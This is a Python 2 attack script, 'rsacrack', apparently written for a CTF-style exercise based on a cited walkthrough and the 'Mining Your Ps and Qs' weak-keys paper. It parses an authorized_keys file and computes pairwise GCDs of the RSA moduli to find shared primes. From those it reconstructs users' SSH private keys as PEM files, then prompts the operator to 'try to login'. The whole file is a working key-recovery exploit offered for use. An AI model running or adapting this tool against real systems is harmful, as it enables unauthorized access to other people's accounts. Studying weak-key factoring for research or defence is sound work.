# rsacrack tool by d7x
# based on Bernie Lim's walkthrough and several other references which use weak randomizing of keys in order to generate a private key, uses rsatool by ius to generate the PEM keys by passing p and q
# of the user
# https://www.promiselabs.net
# https://d7x.promiselabs.net
# 
# references:
# https://hackso.me/rsa-1-walkthrough/ - Hand over the Keys by Bernie Lim
# https://factorable.net/weakkeys12.conference.pdf - Mining Your Ps and Qs: Detection of Widespread Weak Keys in Network Devices
# https://github.com/ius/rsatool - rsatool can be used to calculate RSA and RSA-CRT parameters
# https://medium.com/asecuritysite-when-bob-met-alice/cracking-rsa-a-challenge-generator-2b64c4edb3e7 - Cracking RSA - A Challenge Generator by Prof Bill Buchanan 
#   Efficiently recover non-trivial factors of n
#    See: Handbook of Applied Cryptography
#   8.2.2 Security of RSA -> (i) Relation to factoring (p.287)
#    http://www.cacr.math.uwaterloo.ca/hac/
#

#!/usr/bin/python
import sys;
import subprocess;
from itertools import combinations;
from fractions import gcd;
from rsatool import rsatool;

result = []


FILE='authorized_keys'
list = []
rsa_list_result = [];

rsa_list = {};
users = {};
i = 0;
# extract ssh keys in a list
with open(FILE) as f:
	keys_list = f.readlines();
	
# generate RSA modulus for each key
for x in keys_list:
	subprocess.call('echo "%s" > /tmp/rsa_; chmod 600 /tmp/rsa_' % x, shell=True);
	rsa_list[i] = subprocess.check_output("ssh-keygen -e -m PEM -f /tmp/rsa_ | openssl rsa -RSAPublicKey_in -in - -modulus -noout| cut -d '=' -f2", shell=True);
	rsa_list[i] = int(rsa_list[i].rstrip("\n"), 16);
	# store usernames
	users[i] = x.split()[-1].split('@')[0];
	# print users[i];
	list.append(str(i))
	i+=1;
	#print rsa_list[x];

#for i in rsa_list:
#	print rsa_list[i];
#print rsa_list;

# calculate gcd
p_q1_q2_list = {};
p_q1_q2_list['p'] = {};
p_q1_q2_list['q1'] = {};
p_q1_q2_list['q2'] = {};
p_q1_q2_list['user1'] = {};
p_q1_q2_list['user2'] = {};
x = 0;
for (i, j) in combinations(list, 2):
	i=int(i);
	j=int(j);
	x=int(x);
	p = gcd(rsa_list[i], rsa_list[j])
	if (p != 1):
		result.append((i, j, p, rsa_list[i]/p, rsa_list[j]/p))
		rsa_list_result.append((keys_list[i].rstrip(), keys_list[j].rstrip()))
		p_q1_q2_list['user1'][x] = users[i];
		p_q1_q2_list['user2'][x] = users[j];
		p_q1_q2_list['p'][x] = p;
		p_q1_q2_list['q1'][x] = rsa_list[i]/p;
		p_q1_q2_list['q2'][x] = rsa_list[j]/p;
		x+=1;
		
		# break

# print result

print "RSA Keys with common divisor: "
print rsa_list_result[0]
# print "p, q1, q2:"

# define savekey function
def savekey(f, data):
	fp = open(f, 'wb')
	fp.write(data)
	fp.close()


# loop over each p, q1, q2 found
c = 0;
for c in range(x):
	print "Generating keys for users %s and %s which share a common p \np: %s" %(p_q1_q2_list['user1'][c],p_q1_q2_list['user2'][c], p_q1_q2_list['p'][c])
	# for current in p_q1_q2_list:
	print "User %s key:" % (p_q1_q2_list['user1'][c])
	print "(q=%d)" % p_q1_q2_list['q1'][c]
	
	# generate user1 key using p and q1
	# print p_q1_q2_list['q1'][c]
	rsa = rsatool.RSA(p=p_q1_q2_list['p'][c], q=p_q1_q2_list['q1'][c], e=65537)
	data = rsa.to_pem()
	print data;
	f = p_q1_q2_list['user1'][c] + '.pem';
	print('Saving to %s' % (f))
	savekey(f, data)
	print("\n");
	
	# generate user2 key using p and q2
	
	print "User %s key :" % (p_q1_q2_list['user2'][c])
	print "(q=%d)" % p_q1_q2_list['q2'][c]
	# print p_q1_q2_list['q2'][c];
	rsa = rsatool.RSA(p=p_q1_q2_list['p'][c], q=p_q1_q2_list['q2'][c], e=65537)
	data = rsa.to_pem()
	print data;
	f = p_q1_q2_list['user2'][c] + '.pem';
	print('Saving to %s' % (f))
	savekey(f, data)
	print("\n");

print "Generating keys done, now try to login. "